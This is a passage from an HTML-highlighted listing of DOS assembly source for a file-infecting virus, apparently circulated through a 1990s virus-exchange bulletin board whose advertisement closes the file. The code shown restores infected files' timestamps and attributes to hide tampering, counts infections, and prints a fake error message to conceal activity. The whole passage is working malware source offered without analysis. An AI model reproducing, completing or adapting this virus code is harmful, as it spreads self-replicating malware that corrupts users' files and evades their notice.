        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">orig_time</span><span class="sc0">            </span><span class="sc1">; Get the date stamp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">orig_date</span><span class="sc0">            </span><span class="sc1">; Get the time stamp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Set file date/time sub-service</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                  </span><span class="sc1">; Get/Set file date and time service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; Call DOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; Close handle DOS service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">orig_attr</span><span class="sc0">            </span><span class="sc1">; Get the file's original attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Instruct DOS to put it back there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">         </span><span class="sc1">; Feed it the filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">; Call DOS</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">exit_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">files_found</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; Are at least 6 files infected?</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">print_fake</span><span class="sc0">              </span><span class="sc1">; If not, keep a low profile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">success</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Did we infect anything?</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">print_fake</span><span class="sc0">              </span><span class="sc1">; If so, cover it up</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                  </span><span class="sc1">; Use DOS print string service</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">virus_msg</span><span class="sc0">    </span><span class="sc1">; Print "Busted!"</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">terminate</span><span class="sc0">
</span><span class="sc5">print_fake</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                  </span><span class="sc1">; Use DOS to print fake error message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fake_msg</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                  </span><span class="sc1">; DOS terminate process function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; Call DOS to get out of this program</span><span class="sc0">
</span><span class="sc5">endvir</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ&gt; and Remember Don't Forget to Call &lt;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span></div></body>
</html>
